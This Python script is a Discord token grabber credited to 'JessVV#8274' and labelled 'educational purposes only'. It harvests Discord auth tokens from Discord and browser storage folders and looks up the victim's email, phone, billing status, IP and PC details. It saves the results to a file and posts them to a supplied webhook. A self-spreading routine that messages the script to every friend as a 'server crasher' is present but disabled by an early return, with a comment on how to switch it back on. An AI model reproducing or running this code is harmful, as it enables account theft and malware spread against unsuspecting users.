import sys
from sys import argv
import os
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from colorama import Fore, Back, Style
import ctypes
import platform
import time

ctypes.windll.kernel32.SetConsoleTitleW("[ View Token ] - By JessVV#8274")

print(Fore.GREEN + "\nDisclaimer:\n")
print(Fore.YELLOW + "This is for educational purposes only.")
print(Fore.YELLOW + "I am not responsible for any damage done by this bot.\n")

r = input(Fore.CYAN+"Continue?? (Y/N): ").lower()
if r == "y":
    print("Initializing Bot...")
elif r == "n":
    print(Style.RESET_ALL)
    sys.exit(0)
else:
    print(Style.RESET_ALL)
    sys.exit(0)

print(Style.RESET_ALL)

def clear():
    time.sleep(2)

    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

if __name__ == "__main__":
    clear()

print(Fore.RED + f'''


                        ██╗░░░██╗██╗███████╗░██╗░░░░░░░██╗  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
                        ██║░░░██║██║██╔════╝░██║░░██╗░░██║  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
                        ╚██╗░██╔╝██║█████╗░░░╚██╗████╗██╔╝  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
                        ░╚████╔╝░██║██╔══╝░░░░████╔═████║░  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
                        ░░╚██╔╝░░██║███████╗░░╚██╔╝░╚██╔╝░  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
                        ░░░╚═╝░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝

   
        ''' )
        
        
print(Style.RESET_ALL)
print("Press enter for omit ")
print(" ")


webhook_1 = input("[+] Webhook: ")


webhook_here = webhook_1



LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ku4GBMdn")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)  

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            

            print("\n[+] Account Info")
            print(f"\n User: {username} - ID: {user_id} ")
            print(f"\n ~ Email: {email}")
            print(f"\n ~ Phone: {phone}")
            print(f"\n ~ Nitro: {nitro}")
            print(f"\n ~ Billing Info: {billing}")

            print("\n[+] PC info")
            print(f"\n ~ IP: {ip}")
            print(f"\n ~ Username: {pc_username}")
            print(f"\n ~ PC Name: {pc_name}")

            print(f"\n[+] Token info:")
            print(f"\n ~ Token Location: {platform}")
            print(f"\n ~ Token: {token}")
            print(f"\n\nA Result_Info.txt file was created ")

            file = open("Result_Info.txt", "a")
            file.write("[+] Account Info")
            file.write(f"\n User: {username} - ID: {user_id} ")
            file.write(f"\n ~ Email: {email}")
            file.write(f"\n ~ Phone: {phone}")
            file.write(f"\n ~ Nitro: {nitro}")
            file.write(f"\n ~ Billing Info: {billing}")

            file.write("\n[+] PC info")
            file.write(f"\n ~ IP: {ip}")
            file.write(f"\n ~ Username: {pc_username}")
            file.write(f"\n ~ PC Name: {pc_name}")

            file.write(f"\n[+] Token info:")
            file.write(f"\n ~ Token Location: {platform}")
            file.write(f"\n ~ Token: {token}\n\n")
            
            
            file.close

            embed = {
                "color": 0xffc1d3,
                "fields": [
                    {
                        "name": f'**Account Info**',
                        "value": f'~ `Email:` {email}\n\n~ `Phone:` {phone}\n\n~ `Nitro:` {nitro}\n\n~ `Billing Info:` {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'~ `IP:` {ip}\n\n~ `Username:` {pc_username}\n\n~ `PC Name:` {pc_name}\n\n~ `Token Location:` {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": f'||{token}||',
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username}\nID:  ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f'Token Grabber By JessVV#8274',
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
    }
    try:
        urlopen(Request(f"{webhook_1}", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass
salir = input(Fore.CYAN+'                                                                                                           Exit: [X]\n').lower()
if salir == "x":
    print(Style.RESET_ALL)
    pass
    sys.exit(0)
elif salir == "[X]":
    print(Style.RESET_ALL)
    pass
    sys.exit(0)
elif salir == "[x]":
    print(Style.RESET_ALL)
    pass
    sys.exit(0)
else:
    print(Style.RESET_ALL)
    pass
    sys.exit(0)
    